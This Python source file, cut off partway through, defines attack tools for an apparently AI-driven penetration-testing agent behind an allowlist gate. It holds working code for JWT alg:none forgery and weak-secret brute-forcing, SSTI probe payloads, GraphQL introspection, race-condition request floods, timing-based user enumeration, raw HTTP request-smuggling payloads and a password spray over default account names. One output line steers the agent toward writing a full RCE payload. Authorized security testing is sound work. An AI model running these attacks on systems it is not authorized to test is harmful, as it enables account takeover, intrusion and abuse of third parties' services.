"""Web-probe MCP tools — reuses tools.attack_modules.modules.web / crypto_jwt / auth_creds entrypoints (split from god file)."""

from __future__ import annotations

import json
import re
import time
from typing import Any

from tools.attack_modules.modules.auth_creds import PasswordSpray as PasswordSprayModule
from tools.attack_modules.modules.crypto_jwt import JWTTamper as JWTTamperModule

# Reuse attack module entrypoints — single source is tools.attack_modules.modules.*
from tools.attack_modules.modules.web import (
    GraphQLIntrospect as GraphQLIntrospectModule,
)
from tools.attack_modules.modules.web import (
    RaceRequest as RaceRequestModule,
)
from tools.attack_modules.modules.web import (
    RequestSmuggling as RequestSmugglingModule,
)
from tools.attack_modules.modules.web import (
    SSTIProbe as SSTIProbeModule,
)
from tools.attack_modules.modules.web import (
    TimingOracle as TimingOracleModule,
)
from tools.mcp_tools.registry import ToolContext
from tools.validation_utils import validate_target_or_ip

_MIN_PORT = 1
_MAX_PORT = 65535
_MIN_CONCURRENT = 2
_MAX_CONCURRENT = 100
_MIN_TOOL_TIMEOUT = 5
_MAX_TOOL_TIMEOUT = 300
_DEFAULT_TOOL_TIMEOUT = 90
_MAX_OUTPUT_CHARS = 20000
_MAX_ENDPOINT_CHARS = 2048


def _has_crlf(value: str) -> bool:
    """True when ``value`` contains CR/LF (HTTP request-line/header injection)."""
    return "\r" in value or "\n" in value


def _check_target(target_ip: Any) -> tuple[str | None, str]:
    """Validate ``target_ip`` syntax (non-empty, no CR/LF, IP-or-domain).

    Returns ``(stripped_target, "")`` or ``(None, error)``. Syntax pre-gate
    only — authorization stays with ``@require_allowlist`` (the gate sees the
    full input; nothing is truncated here).
    """
    if not isinstance(target_ip, str) or not target_ip.strip():
        return None, "BLOCKED: target_ip is required."
    if _has_crlf(target_ip):
        return None, "BLOCKED: target_ip must not contain CR/LF characters."
    tip = target_ip.strip()
    if not validate_target_or_ip(tip):
        return None, "BLOCKED: target_ip must be a valid IP address or domain."
    return tip, ""


def _check_port(port: Any) -> tuple[int | None, str]:
    """Validate a TCP port (1-65535). Returns ``(port, "")`` or ``(None, error)``."""
    candidate: Any = port
    if isinstance(candidate, str):
        candidate = candidate.strip()
        if not candidate.isdigit():
            return None, "BLOCKED: port must be an integer between 1 and 65535."
        candidate = int(candidate)
    if isinstance(candidate, bool) or not isinstance(candidate, int):
        return None, "BLOCKED: port must be an integer between 1 and 65535."
    if candidate < _MIN_PORT or candidate > _MAX_PORT:
        return None, "BLOCKED: port must be an integer between 1 and 65535."
    return candidate, ""


def _check_concurrent(value: Any) -> tuple[int | None, str]:
    """Validate the race-request fan-out (2-100). Returns ``(n, "")`` or ``(None, error)``."""
    candidate: Any = value
    if isinstance(candidate, str):
        candidate = candidate.strip()
        if not candidate.isdigit():
            return None, f"BLOCKED: concurrent must be an integer between {_MIN_CONCURRENT} and {_MAX_CONCURRENT}."
        candidate = int(candidate)
    if isinstance(candidate, bool) or not isinstance(candidate, int):
        return None, f"BLOCKED: concurrent must be an integer between {_MIN_CONCURRENT} and {_MAX_CONCURRENT}."
    if candidate < _MIN_CONCURRENT or candidate > _MAX_CONCURRENT:
        return None, f"BLOCKED: concurrent must be between {_MIN_CONCURRENT} and {_MAX_CONCURRENT}."
    return candidate, ""


def _check_endpoint(endpoint: Any) -> tuple[str | None, str]:
    """Validate an HTTP request path (absolute, no CR/LF/whitespace).

    Returns ``(path, "")`` or ``(None, error)``. The path is interpolated
    into the raw request line, so CR/LF or whitespace would be header
    injection — reject, never sanitize.
    """
    if not isinstance(endpoint, str):
        return None, "BLOCKED: endpoint must be an absolute path starting with '/'."
    ep = endpoint.strip()
    if not ep or not ep.startswith("/"):
        return None, "BLOCKED: endpoint must be an absolute path starting with '/'."
    if _has_crlf(ep):
        return None, "BLOCKED: endpoint must not contain CR/LF characters."
    if re.search(r"\s", ep):
        return None, "BLOCKED: endpoint must not contain whitespace."
    if len(ep) > _MAX_ENDPOINT_CHARS:
        return None, f"BLOCKED: endpoint is too long (max {_MAX_ENDPOINT_CHARS} chars)."
    return ep, ""


def _clamp_timeout(timeout: Any) -> int:
    """Clamp a tool deadline to [_MIN_TOOL_TIMEOUT, _MAX_TOOL_TIMEOUT] seconds."""
    try:
        if isinstance(timeout, bool):
            raise ValueError("bool is not a timeout")
        value = int(timeout) if not isinstance(timeout, int) else timeout
    except (TypeError, ValueError):
        return _DEFAULT_TOOL_TIMEOUT
    return max(_MIN_TOOL_TIMEOUT, min(_MAX_TOOL_TIMEOUT, value))


def _http_host(target_ip: str) -> str:
    """Host-header value for ``target_ip`` (brackets IPv6 literals)."""
    t = target_ip.strip()
    if ":" in t and not t.startswith("["):
        return f"[{t}]"
    return t


def _open_connection(host: str, port: int, timeout: float) -> Any:
    """Open a TCP connection usable as a context manager (IPv4/IPv6/domain).

    ``socket.create_connection`` resolves domains and tries each resolved
    address, so IPv6 literals and FQDNs work (plain ``AF_INET`` + ``connect``
    did not). Callers must use ``with`` so the socket always closes.
    """
    import socket as _sock

    return _sock.create_connection((host, port), timeout=timeout)


def _sock_budget(default: float, deadline: float) -> float:
    """Per-connection socket timeout honoring the tool deadline (<=0 = expired)."""
    remaining = deadline - time.monotonic()
    if remaining <= 0:
        return 0.0
    return max(1.0, min(default, remaining))


def _preview(value: str, limit: int) -> str:
    """Display preview of ``value`` cut to ``limit`` chars with a marker."""
    if len(value) <= limit:
        return value
    return value[:limit] + "... [truncated]"


def _finish(lines: list[str]) -> str:
    """Join result lines, cutting only the display tail (marked) when huge."""
    text = "\n".join(lines)
    if len(text) > _MAX_OUTPUT_CHARS:
        text = text[:_MAX_OUTPUT_CHARS] + "\n[truncated]"
    return text


def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    search = ctx.search
    nvd = ctx.nvd
    researcher = ctx.researcher
    audit_tool = ctx.audit_tool
    require_allowlist = ctx.require_allowlist

    @mcp.tool()
    @require_allowlist()
    def jwt_tamper(target_ip: str, jwt_token: str = "", timeout: int = 90) -> str:
        """Test JWT tokens for algorithm confusion (alg:none), HMAC key confusion, and weak secret brute-force.

        Args:
            target_ip: Target host (IP or domain, must be allowlisted). Used only
                for token auto-discovery when ``jwt_token`` is empty.
            jwt_token: JWT to analyze (``header.payload.signature``). When empty,
                the tool probes common login/token endpoints for a token.
            timeout: Overall tool deadline in seconds (clamped 5-300).

        Returns:
            JWT_TAMPER_RESULTS envelope with discovery notes, alg:none
            material, and weak-secret findings.

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target syntax + CR/LF pre-gates before any socket opens.

        Side-effects:
            Network: TCP reads against target_ip:80 only during discovery.
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        if jwt_token and _has_crlf(jwt_token):
            return "BLOCKED: jwt_token must not contain CR/LF characters."
        deadline = time.monotonic() + _clamp_timeout(timeout)

        import base64 as _b64
        import hashlib as _hashlib
        import hmac as _hmac

        result_lines = [f"JWT_TAMPER_RESULTS: {host}", ""]

        # If no token provided, try to discover one
        token = jwt_token.strip() if jwt_token else ""
        if not token:
            host_hdr = _http_host(host)
            # Phase 4: expanded discovery paths (Keycloak, WordPress, OAuth)
            for path in [
                "/api/auth/login",
                "/login",
                "/auth",
                "/api/token",
                "/api/v1/login",
                "/signin",
                "/oauth/token",
                "/api/me",
                "/api/session",
                "/api/auth/token",
                "/api/access-token",
                "/auth/realms/master/protocol/openid-connect/token",
                "/wp-json/jwt-auth/v1/token",
                "/.well-known/openid-configuration",
            ]:
                if time.monotonic() >= deadline:
                    result_lines.append("Discovery stopped at tool deadline (partial coverage).")
                    break
                try:
                    budget = _sock_budget(5.0, deadline)
                    if budget <= 0:
                        result_lines.append("Discovery stopped at tool deadline (partial coverage).")
                        break
                    with _open_connection(host, 80, budget) as s:
                        s.sendall(f"GET {path} HTTP/1.0\r\nHost: {host_hdr}\r\n\r\n".encode())
                        resp = s.recv(8192).decode(errors="replace")
                        match = re.search(r"[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}", resp)
                        if match:
                            token = match.group(0)
                            result_lines.append(f"Discovered JWT at {path}: {_preview(token, 60)}")
                            break
                except Exception:  # ponytail: bare except intentional
                    pass

        if not token:
            return _finish(result_lines) + "\nNo JWT token found. Provide one via jwt_token parameter."

        parts = token.split(".")
        if len(parts) != 3:
            return _finish(result_lines) + "\nInvalid JWT format (expected header.payload.signature)."

        def _b64url_decode(data: str) -> bytes:
            data = data.replace("-", "+").replace("_", "/")
            padding = 4 - len(data) % 4
            if padding != 4:
                data += "=" * padding
            return _b64.b64decode(data)

        def _b64url_encode(data: bytes) -> str:
            return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

        try:
            header = json.loads(_b64url_decode(parts[0]))
            result_lines.append(f"Header: {json.dumps(header)}")
        except Exception:  # ponytail: bare except intentional
            header = {}
            result_lines.append("Header: (could not decode)")

        # Test 1: alg:none
        result_lines.append("")
        result_lines.append("--- alg:none attack ---")
        none_header = dict(header)
        none_header["alg"] = "none"
        none_token = f"{_b64url_encode(json.dumps(none_header).encode())}.{parts[1]}."
        result_lines.append(f"None-alg token: {_preview(none_token, 80)}")
        result_lines.append("To test: curl -H 'Authorization: Bearer " + none_token + f"' http://{host}/api/me")

        # Test 2: Weak HMAC secrets
        result_lines.append("")
        result_lines.append("--- Weak HMAC secret brute-force ---")
        alg = header.get("alg", "")
        if alg.startswith("HS"):
            hash_name = alg.replace("HS", "sha")
            # Phase 4: expanded weak-secret list (rockyou-top / jwt-secrets style)
            secrets = [
                "secret",
                "key",
                "jwt_secret",
                "private_key",
                "changeme",
                "password",
                "123456",
                "admin",
                "secret_key",
                "jwt-secret",
                "token",
                "auth",
                "supersecret",
                "qwerty",
                "letmein",
                "welcome",
                "administrator",
                "api_secret",
                "flask-secret",
                "django-insecure-",
                "node",
                "nodejs",
                "express",
                "nextauth",
                "supabase",
                "firebase",
                "prod",
                "staging",
                "dev",
                "test",
                "12345678",
                "password123",
                "secret123",
                "changethis",
            ]
            found_secrets = []
            for secret in secrets:
                try:
                    sig = _b64url_encode(
                        _hmac.new(
                            secret.encode(),
                            f"{parts[0]}.{parts[1]}".encode(),
                            getattr(_hashlib, hash_name, _hashlib.sha256),
                        ).digest()
                    )
                    if sig == parts[2]:
                        found_secrets.append(secret)
                except Exception:  # ponytail: bare except intentional
                    pass
            if found_secrets:
                result_lines.append(f"WEAK SECRET FOUND: {found_secrets}")
            else:
                result_lines.append("No weak secrets found from common list.")
        else:
            result_lines.append(f"Algorithm is {alg}, not HMAC-based. Try HMAC-to-RSA confusion if alg starts with RS.")

        # Test 3: HMAC-to-RSA confusion
        if alg.startswith("RS"):
            result_lines.append("")
            result_lines.append("--- HMAC-to-RSA key confusion ---")
            result_lines.append(
                "If RSA public key is exposed (/.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret."
            )

        return _finish(result_lines)

    @mcp.tool()
    @require_allowlist()
    def ssti_probe(target_ip: str, port: int = 80, timeout: int = 90) -> str:
        """Probe for Server-Side Template Injection (SSTI) across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines.

        Args:
            target_ip: Target host (IP or domain, must be allowlisted).
            port: Target TCP port (1-65535).
            timeout: Overall tool deadline in seconds (clamped 5-300); the
                endpoint/param/payload sweep stops early when it expires.

        Returns:
            SSTI_PROBE_RESULTS envelope with the detected engine (if any).

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target syntax + CR/LF and port range pre-gates before any socket.

        Side-effects:
            Network: opens TCP connections to target_ip:port (read-only GETs).
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        port_num, err = _check_port(port)
        if err or port_num is None:
            return err
        dport: int = port_num
        deadline = time.monotonic() + _clamp_timeout(timeout)

        import urllib.parse as _urlparse

        host_hdr = _http_host(host)
        result_lines = [f"SSTI_PROBE_RESULTS: {host}:{dport}", ""]

        math_payloads = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Freemarker"),
            ("#{7*7}", "49", "Velocity"),
            ("<%= 7*7 %>", "49", "ERB/Ruby"),
            ("{{=7*7}}", "49", "Mako"),
            ("{7*7}", "49", "Smarty"),
            # Phase 4: additional engines + disambiguators
            ("<{7*7}>", "49", "StringTemplate"),
            ("{{7*'7'}}", "4977", "DotLiquid/Jinja2"),
            ("{% debug %}", "debug", "Pebble/Twig"),
            ("{{this.constructor.constructor('return 7')()}}", "7", "Handlebars"),
        ]

        endpoints = [
            "/",
            "/search",
            "/profile",
            "/user",
            "/page",
            "/render",
            "/preview",
            # Phase 4: template-render-heavy endpoints
            "/api/render",
            "/template",
            "/message",
            "/comment",
            "/email/preview",
            "/format",
            "/eval",
            "/compile",
            "/v1/render",
            "/admin/template",
        ]
        params = [
            "q",
            "search",
            "name",
            "username",
            "id",
            "page",
            "input",
            "data",
            # Phase 4: template/body params
            "template",
            "body",
            "content",
            "message",
            "text",
            "html",
            "subject",
            "recipient",
            "to",
            "from",
            "title",
        ]

        found_engine = None
        stopped_early = False
        for ep in endpoints:
            for param in params:
                for payload, expected, engine in math_payloads:
                    if time.monotonic() >= deadline:
                        stopped_early = True
                        break
                    try:
                        budget = _sock_budget(5.0, deadline)
                        if budget <= 0:
                            stopped_early = True
                            break
                        with _open_connection(host, dport, budget) as s:
                            path = f"{ep}?{param}={_urlparse.quote(payload)}"
                            s.sendall(f"GET {path} HTTP/1.0\r\nHost: {host_hdr}\r\n\r\n".encode())
                            resp = s.recv(8192).decode(errors="replace")
                            if expected in resp:
                                result_lines.append(f"[DETECTED] {engine} at {ep}?{param}=<payload>")
                                result_lines.append(f"  Payload: {payload} -> reflected {expected}")
                                found_engine = engine
                                break
                    except Exception:  # ponytail: bare except intentional
                        pass
                if found_engine or stopped_early:
                    break
            if found_engine or stopped_early:
                break

        if stopped_early and not found_engine:
            result_lines.append("Sweep stopped at tool deadline (partial coverage).")
        if not found_engine:
            result_lines.append("No SSTI detected on common endpoints.")
        else:
            result_lines.append("")
            result_lines.append(f"Engine: {found_engine}")
            result_lines.append("Use write_python_file to generate a full RCE payload for this engine.")

        return _finish(result_lines)

    @mcp.tool()
    @require_allowlist()
    def graphql_introspect(target_ip: str, port: int = 80, timeout: int = 90) -> str:
        """Extract GraphQL schema via introspection query.

        Args:
            target_ip: Target host (IP or domain, must be allowlisted).
            port: Target TCP port (1-65535).
            timeout: Overall tool deadline in seconds (clamped 5-300).

        Returns:
            GRAPHQL_INTROSPECT_RESULTS envelope with the endpoint found (if
            any), exposed type names (capped at 20), and a batching verdict.

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target syntax + CR/LF and port range pre-gates before any socket.

        Side-effects:
            Network: opens TCP connections to target_ip:port (introspection +
            batching POSTs). Sockets always close via context managers.
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        port_num, err = _check_port(port)
        if err or port_num is None:
            return err
        dport: int = port_num
        deadline = time.monotonic() + _clamp_timeout(timeout)

        host_hdr = _http_host(host)
        result_lines = [f"GRAPHQL_INTROSPECT_RESULTS: {host}:{dport}", ""]

        intro_query = json.dumps(
            {
                "query": """
            query { __schema { queryType { name } mutationType { name } types { name kind description fields { name } } } }
        """
            }
        )

        endpoints = [
            "/graphql",
            "/gql",
            "/api/graphql",
            "/v1/graphql",
            "/query",
            # Phase 4: expanded GraphQL surface
            "/api/v1/graphql",
            "/public/graphql",
            "/graphql/schema",
            "/api/schema",
            "/__graphql",
            "/api",
            "/graphql/batch",
            "/g",
        ]
        found = None

        def _post(ep: str, body: bytes, budget: float) -> str:
            with _open_connection(host, dport, budget) as s:
                req = (
                    f"POST {ep} HTTP/1.0\r\n"
                    f"Host: {host_hdr}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"\r\n"
                ).encode() + body
                s.sendall(req)
                return s.recv(16384).decode(errors="replace")

        for ep in endpoints:
            if time.monotonic() >= deadline:
                result_lines.append("Endpoint sweep stopped at tool deadline (partial coverage).")
                break
            try:
                budget = _sock_budget(8.0, deadline)
                if budget <= 0:
                    result_lines.append("Endpoint sweep stopped at tool deadline (partial coverage).")
                    break
                resp = _post(ep, intro_query.encode(), budget)

                if "__schema" in resp or "queryType" in resp:
                    found = ep
                    result_lines.append(f"[+] GraphQL endpoint found: {ep}")
                    result_lines.append("  Introspection ENABLED!")
                    # Extract type names
                    type_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', resp)
                    if type_matches:
                        result_lines.append(f"  Types exposed: {', '.join(type_matches[:20])}")
                    break
                elif "graphql" in resp.lower() or "query" in resp.lower():
                    result_lines.append(f"[?] Possible GraphQL at {ep} (introspection may be disabled)")
            except Exception:  # ponytail: bare except intentional
                pass

        if not found:
            result_lines.append("No GraphQL endpoint found with introspection enabled.")

        # Batching test
        if found:
            if time.monotonic() >= deadline:
                result_lines.append("Batching test skipped at tool deadline.")
                return _finish(result_lines)
            result_lines.append("")
            result_lines.append("--- Batching attack test ---")
            batch_body = json.dumps(
                [
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                    {"query": "{ __typename }"},
                ]
            ).encode()
            try:
                budget = _sock_budget(8.0, deadline)
                if budget <= 0:
                    result_lines.append("Batching test skipped at tool deadline.")
                    return _finish(result_lines)
                with _open_connection(host, dport, budget) as s:
                    req = (
                        f"POST {found} HTTP/1.0\r\n"
                        f"Host: {host_hdr}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(batch_body)}\r\n"
                        f"\r\n"
                    ).encode() + batch_body
                    s.sendall(req)
                    resp = s.recv(8192).decode(errors="replace")
                if resp.count("__typename") >= 5:
                    result_lines.append("[+] Batching ENABLED! Multiple queries processed in one request.")
                else:
                    result_lines.append("[-] Batching blocked or not supported.")
            except Exception:  # ponytail: bare except intentional
                result_lines.append("Batching test failed.")

        return _finish(result_lines)

    @mcp.tool()
    @require_allowlist()
    def race_request(
        target_ip: str,
        port: int = 80,
        endpoint: str = "/api/redeem",
        concurrent: int = 20,
        timeout: int = 90,
    ) -> str:
        """Send N concurrent HTTP requests to exploit TOCTOU race conditions.

        Args:
            target_ip: Target host (IP or domain, must be allowlisted).
            port: Target TCP port (1-65535).
            endpoint: Absolute request path starting with '/' (no CR/LF or
                whitespace — it is interpolated into the raw request line).
            concurrent: Parallel requests (2-100).
            timeout: Overall tool deadline in seconds (clamped 5-300).

        Returns:
            RACE_REQUEST_RESULTS envelope with success/failure counts and a
            mixed-status verdict.

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target/port/endpoint/concurrent shape pre-gates before any socket.

        Side-effects:
            Network: opens up to ``concurrent`` TCP connections to
            target_ip:port (state-changing POSTs by design).
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        port_num, err = _check_port(port)
        if err or port_num is None:
            return err
        dport: int = port_num
        ep, err = _check_endpoint(endpoint)
        if err or ep is None:
            return err
        path: str = ep
        workers, err = _check_concurrent(concurrent)
        if err or workers is None:
            return err
        fanout: int = workers
        deadline = time.monotonic() + _clamp_timeout(timeout)

        import concurrent.futures as _cf
        import threading as _thr

        host_hdr = _http_host(host)
        result_lines = [f"RACE_REQUEST_RESULTS: {host}:{dport}{path}", ""]
        result_lines.append(f"Concurrent requests: {fanout}")

        results = {"success": 0, "failure": 0, "statuses": []}
        lock = _thr.Lock()

        def _send_one() -> dict:
            try:
                budget = _sock_budget(8.0, deadline)
                if budget <= 0:
                    with lock:
                        results["failure"] += 1
                    return {"error": "tool deadline reached"}
                with _open_connection(host, dport, budget) as s:
                    body = json.dumps({"code": "TEST100", "user": "attacker"}).encode()
                    req = (
                        f"POST {path} HTTP/1.0\r\n"
                        f"Host: {host_hdr}\r\n"
                        f"Content-Type: application/json\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"\r\n"
                    ).encode() + body
                    s.sendall(req)
                    resp = s.recv(4096).decode(errors="replace")
                    status_line = resp.split("\r\n")[0] if resp else ""
                    with lock:
                        if "200" in status_line or "201" in status_line:
                            results["success"] += 1
                        else:
                            results["failure"] += 1
                        results["statuses"].append(status_line[:100])
                    return {"status": status_line[:100]}
            except Exception as e:  # ponytail: bare except intentional
                with lock:
                    results["failure"] += 1
                return {"error": str(e)}

        start = time.monotonic()
        with _cf.ThreadPoolExecutor(max_workers=min(fanout, 50)) as executor:
            futures = [executor.submit(_send_one) for _ in range(fanout)]
            wait_for = _sock_budget(60.0, deadline)
            if wait_for <= 0:
                wait_for = 1.0
            _cf.wait(futures, timeout=wait_for)
            for fut in futures:
                if not fut.done():
                    fut.cancel()

        elapsed = time.monotonic() - start
        result_lines.append(f"Completed in {elapsed:.1f}s")
        result_lines.append(f"Success: {results['success']}, Failure: {results['failure']}")

        unique_statuses = set(s.split(" ")[1] if " " in s else s for s in results["statuses"] if s)
        if len(unique_statuses) > 1:
            result_lines.append(f"[!] Mixed status codes: {unique_statuses} — possible race condition!")
        if results["success"] > 1:
            result_lines.append(f"[!] {results['success']} requests succeeded — limit may be bypassed!")

        return _finish(result_lines)

    @mcp.tool()
    @require_allowlist()
    def timing_oracle(target_ip: str, port: int = 80, timeout: int = 90) -> str:
        """Detect timing side-channels in login, password reset, and token validation endpoints.

        Args:
            target_ip: Target host (IP or domain, must be allowlisted).
            port: Target TCP port (1-65535).
            timeout: Overall tool deadline in seconds (clamped 5-300); sampling
                stops early when it expires (reported as insufficient samples).

        Returns:
            TIMING_ORACLE_RESULTS envelope with mean-time comparisons.

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target syntax + CR/LF and port range pre-gates before any socket.

        Side-effects:
            Network: opens TCP connections to target_ip:port (login/reset
            POSTs with dummy credentials).
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        port_num, err = _check_port(port)
        if err or port_num is None:
            return err
        dport: int = port_num
        deadline = time.monotonic() + _clamp_timeout(timeout)

        import statistics as _stats

        host_hdr = _http_host(host)
        result_lines = [f"TIMING_ORACLE_RESULTS: {host}:{dport}", ""]

        def _measure(endpoint: str, body: str, samples: int = 8) -> list[float]:
            times = []
            for _ in range(samples):
                if time.monotonic() >= deadline:
                    break
                try:
                    budget = _sock_budget(8.0, deadline)
                    if budget <= 0:
                        break
                    with _open_connection(host, dport, budget) as s:
                        data = body.encode()
                        req = (
                            f"POST {endpoint} HTTP/1.0\r\n"
                            f"Host: {host_hdr}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: {len(data)}\r\n"
                            f"\r\n"
                        ).encode() + data
                        t0 = time.perf_counter()
                        s.sendall(req)
                        s.recv(4096)
                        elapsed = (time.perf_counter() - t0) * 1000
                        times.append(elapsed)
                except Exception:  # ponytail: bare except intentional
                    pass
                time.sleep(0.15)
            return times

        # Test login timing
        result_lines.append("--- Login timing (valid vs invalid user) ---")
        valid_times = _measure("/api/login", json.dumps({"username": "admin", "password": "wrong"}))
        invalid_times = _measure("/api/login", json.dumps({"username": "noexist_xyz", "password": "test"}))

        if len(valid_times) >= 3 and len(invalid_times) >= 3:
            mv = _stats.mean(valid_times)
            mi = _stats.mean(invalid_times)
            diff = abs(mv - mi)
            result_lines.append(f"  Valid user mean: {mv:.1f}ms, Invalid: {mi:.1f}ms, Diff: {diff:.1f}ms")
            if diff > 50:
                result_lines.append("  [+] TIMING ORACLE DETECTED! User enumeration possible via timing.")
            else:
                result_lines.append("  [-] No significant timing difference.")
        else:
            result_lines.append("  Insufficient samples.")

        # Test password reset timing
        result_lines.append("--- Password reset timing ---")
        exist_times = _measure("/api/reset-password", json.dumps({"email": "admin@example.com"}))
        noexist_times = _measure("/api/reset-password", json.dumps({"email": "noexist@example.com"}))

        if len(exist_times) >= 3 and len(noexist_times) >= 3:
            me = _stats.mean(exist_times)
            mn = _stats.mean(noexist_times)
            diff = abs(me - mn)
            result_lines.append(f"  Exist mean: {me:.1f}ms, No-exist: {mn:.1f}ms, Diff: {diff:.1f}ms")
            if diff > 50:
                result_lines.append("  [+] TIMING ORACLE DETECTED! Email enumeration via password reset.")
            else:
                result_lines.append("  [-] No significant timing difference.")
        else:
            result_lines.append("  Insufficient samples.")

        return _finish(result_lines)

    @mcp.tool()
    @require_allowlist()
    def request_smuggling_probe(target_ip: str, port: int = 80, timeout: int = 90) -> str:
        """Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE).

        Args:
            target_ip: Target host (IP or domain, must be allowlisted).
            port: Target TCP port (1-65535).
            timeout: Overall tool deadline in seconds (clamped 5-300); later
                probes are skipped when it expires.

        Returns:
            REQUEST_SMUGGLING_RESULTS envelope with per-technique verdicts.

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target syntax + CR/LF and port range pre-gates before any socket.

        Side-effects:
            Network: opens TCP connections to target_ip:port sending
            intentionally malformed requests (detection only).
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        port_num, err = _check_port(port)
        if err or port_num is None:
            return err
        dport: int = port_num
        deadline = time.monotonic() + _clamp_timeout(timeout)

        host_hdr = _http_host(host)
        result_lines = [f"REQUEST_SMUGGLING_RESULTS: {host}:{dport}", ""]

        def _send_raw(payload: bytes) -> bytes:
            try:
                budget = _sock_budget(10.0, deadline)
                if budget <= 0:
                    return b"ERROR: tool deadline reached"
                with _open_connection(host, dport, budget) as s:
                    s.sendall(payload)
                    time.sleep(0.5)
                    resp = b""
                    try:
                        while True:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                    except OSError:
                        pass
                    return resp
            except Exception as e:  # ponytail: bare except intentional
                return f"ERROR: {e}".encode()

        # Baseline
        baseline = _send_raw(f"POST / HTTP/1.1\r\nHost: {host_hdr}\r\nContent-Length: 0\r\n\r\n".encode())
        result_lines.append(f"Baseline: {len(baseline)} bytes")

        # CL.TE test
        result_lines.append("")
        result_lines.append("--- CL.TE test ---")
        cl_te = (
            f"POST / HTTP/1.1\r\nHost: {host_hdr}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
        ).encode()
        resp = _send_raw(cl_te)
        result_lines.append(f"Response: {len(resp)} bytes")
        if abs(len(resp) - len(baseline)) > 200:
            result_lines.append("[!] Response differs from baseline — possible CL.TE smuggling!")

        if time.monotonic() >= deadline:
            result_lines.append("Remaining probes skipped at tool deadline.")
            return _finish(result_lines)

        # TE.CL test
        result_lines.append("")
        result_lines.append("--- TE.CL test ---")
        te_cl = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host_hdr}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {host_hdr}\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = _send_raw(te_cl)
        text = resp.decode(errors="replace")
        result_lines.append(f"Response: {len(resp)} bytes")
        if "GPOST" in text or "Unrecognized method" in text:
            result_lines.append("[+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")

        if time.monotonic() >= deadline:
            result_lines.append("Remaining probes skipped at tool deadline.")
            return _finish(result_lines)

        # TE.TE test
        result_lines.append("")
        result_lines.append("--- TE.TE test (obfuscated TE header) ---")
        te_te = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host_hdr}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Transfer-encoding: x\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {host_hdr}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        resp = _send_raw(te_te)
        text = resp.decode(errors="replace")
        result_lines.append(f"Response: {len(resp)} bytes")
        if "GPOST" in text:
            result_lines.append("[+] SMUGGLING CONFIRMED via TE.TE obfuscation!")

        return _finish(result_lines)

    @mcp.tool()
    @require_allowlist()
    def password_spray(target_ip: str, port: int = 80, password: str = "Password1", timeout: int = 90) -> str:
        """Spray one password across many common usernames.

        Args:
            target_ip: Target host (IP or domain, must be allowlisted).
            port: Target TCP port (1-65535).
            password: Password to spray (never echoed back — output shows
                ``[redacted]``; the value is never length-capped).
            timeout: Overall tool deadline in seconds (clamped 5-300); the
                username sweep stops early when it expires.

        Returns:
            PASSWORD_SPRAY_RESULTS envelope with per-user verdicts (usernames
            only, no password material) and a success summary.

        Gates:
            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
            target syntax + CR/LF and port range pre-gates before any socket.

        Side-effects:
            Network: opens TCP connections to target_ip:port (login POSTs,
            paced ~1.5s apart to avoid lockout).
        """
        tip, err = _check_target(target_ip)
        if err or tip is None:
            return err
        host: str = tip
        port_num, err = _check_port(port)
        if err or port_num is None:
            return err
        dport: int = port_num
        deadline = time.monotonic() + _clamp_timeout(timeout)

        host_hdr = _http_host(host)
        # The sprayed password is secret material: it must never appear in
        # display output (or the audit-visible result block).
        result_lines = [f"PASSWORD_SPRAY_RESULTS: {host}:{dport}", "Password: [redacted]", ""]

        users = [
            "admin",
            "administrator",
            "root",
            "user",
            "test",
            "guest",
            "info",
            "support",
            "sales",
            "marketing",
            "hr",
            "finance",
            "manager",
            "developer",
            "dev",
            "ops",
            "backup",
            "service",
            # Phase 4: service accounts, cloud defaults, app defaults
            "sql",
            "oracle",
            "sa",
            "postgres",
            "redis",
            "mongo",
            "cassandra",
            "elastic",
            "kibana",
            "jenkins",
            "gitlab",
            "grafana",
            "jira",
            "confluence",
            "svc_account",
